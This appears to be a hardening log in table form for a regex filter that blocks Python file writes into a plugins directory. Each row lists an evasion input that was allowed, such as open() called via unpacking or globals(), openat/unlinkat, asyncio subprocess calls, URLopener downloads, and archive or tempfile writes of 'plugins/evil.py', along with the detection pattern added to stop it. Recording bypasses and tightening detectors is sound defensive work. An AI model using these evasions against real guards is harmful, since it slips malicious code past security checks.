| `tempfile.NamedTemporaryFile(dir='plugins/')` ALLOW | `tempfile` not in any write-primitive pattern; `dir=` argument routes temp file creation into the plugin directory | Added `tempfile\.(?:NamedTemporaryFile|mkstemp|mktemp|mkdtemp|TemporaryDirectory)\s*\([^)]*dir\s*=` (ADV-W27-008) |
| `open(*['plugins/evil.py', 'w'])` ALLOW | star-unpack from a literal list; no `open(` literal in blob | Added `open\s*\(\s*\*\s*\[.*[wa]` star-unpack pattern (ADV-W27-012) |
| `open(**{'mode': 'w', 'file': ...})` ALLOW | dict-unpack bypasses all positional and keyword `mode=` checks | Added `open\s*\(\s*\*\*\s*\{.*mode.*[wa]` dict-unpack pattern (ADV-W27-012) |
| `os.openat(0, 'plugins/evil.py', os.O_WRONLY)` ALLOW | `os\.open\s*\(` pattern did not cover fd-relative `openat` | Extended to `os\.(open\|openat)` (ADV-W27-013) |
| `os.unlinkat(0, 'plugins/evil.py')` ALLOW | `os\.(remove\|unlink\|truncate)` pattern did not cover fd-relative `unlinkat` | Added `unlinkat` to alternation (ADV-W27-013) |
| `asyncio.create_subprocess_exec(...)` ALLOW | only `subprocess.` forms covered; `asyncio.create_subprocess_*` has identical write capability | Added `asyncio\.create_subprocess_(?:exec\|shell)\s*\(` (ADV-W27-014) |
| `urllib.request.URLopener().retrieve(...)` ALLOW | `urlretrieve` as function covered; `URLopener` class + `.retrieve()` method form not matched | Added `urllib\.request\.(?:urlretrieve\|URLopener)\b` (ADV-W27-015) |
| `ET.ElementTree(root).write('plugins/evil.py')` ALLOW | XML serialization via ElementTree writes files without calling `open()`; not in any pattern | Added `(?:ElementTree\|ET)\b[^\n]*\.write\s*\(` (ADV-W27-016) |
| `open('` + 151-char path + `', 'w')` ALLOW | `{0,150}` token cap in open() path-arg pattern exhausted; 151st char not consumed, comma-to-mode never reached | Cap raised to `{0,300}` across all open() positional and keyword branches (ADV-W27-011) |
| `globals()['open']('plugins/evil.py','w')` ALLOW | builtin lookup via `globals()`/`vars()`/`locals()` returns `open` at runtime; no `open(` literal in blob | Added pattern `(?:globals|vars|locals|__dict__)\s*\(\s*\)\s*(?:\[|\.).*\bopen\b` with negative lookbehind (ADV-W28-001) |
| `getattr(p, name='write_text')` ALLOW | mixed positional-then-keyword form where `name=` keyword is in second position; prior pattern only matched first-arg keyword forms | Added standalone `name\s*=\s*[quotes]dangerous_method` pattern independent of first-arg detection (ADV-W28-002) |
| `open('plugins/evil.py', *('w',))` ALLOW | tuple star-unpack `*('w',)` used as mode arg; prior star pattern only matched list `*[...]` form | Changed `\*[^)]*\[` to `\*[^)]*[([\`]` to allow both list `[` and tuple `(` start chars (ADV-W28-004) |
| `open('plugins/evil.py', ['w'][0])` ALLOW | subscript-indexed mode `['w'][0]` has no literal `w` at the mode-arg position | Added subscript-mode branch `open\s*\([^)]{0,300},\s*\[[^]]*[wax][^]]*\]` (ADV-W28-005) |
| `Path('plugins/evil.py').open(*['w'])` ALLOW | star-unpack form `.open(*['w'])` not matched by existing `.open()` literal-mode or `chr()` branches | Extended `.open()` pattern to include `[*]` presence as a trigger (ADV-W28-006) |
| `zipfile.ZipFile('plugins/evil.py', **{'mode':'a'})` ALLOW | dict-unpack `**{...}` form not in zipfile patterns; only positional and `mode=keyword` forms were matched | Added `\*\*\s*\{[^}]*mode` detection to zipfile pattern (ADV-W28-007) |
| `urllib.request.FancyURLopener().retrieve('u','plugins/evil.py')` ALLOW | `FancyURLopener` not in urllib pattern (only `urlretrieve\|URLopener` covered) | Added `FancyURLopener` to urllib alternation (ADV-W28-008) |
| `tarfile.TarFile('plugins/evil.py','w')` ALLOW | tarfile constructor form not in any write-primitive pattern; `tarfile.open()` was missing too | Added `tarfile\.(?:TarFile\|open)\s*\(` to file-write primitives (ADV-W28-009) |
| `tempfile.mkdtemp(dir='plugins/')` ALLOW | `mkdtemp` missing from tempfile alternation (only `NamedTemporaryFile\|mkstemp\|mktemp\|TemporaryDirectory`) | Added `mkdtemp` to tempfile alternation (ADV-W28-010) |
| `tempfile.NamedTemporaryFile(**{'dir':'plugins/'})` ALLOW | dict-unpack `**{'dir':...}` not matched by `dir\s*=` keyword pattern | Added `\*\*\{[^}]*dir` dict-unpack branch to tempfile pattern (ADV-W28-010) |
| `asyncio.get_event_loop().subprocess_exec(proto,'cp','a','plugins/x.py')` ALLOW | only `asyncio.create_subprocess_exec/shell` covered; event-loop `.subprocess_exec/shell` method form missed | Added `\.subprocess_(?:exec\|shell)\s*\(` instance-method pattern and `loop_subprocess` names to relevant lists (ADV-W28-011) |
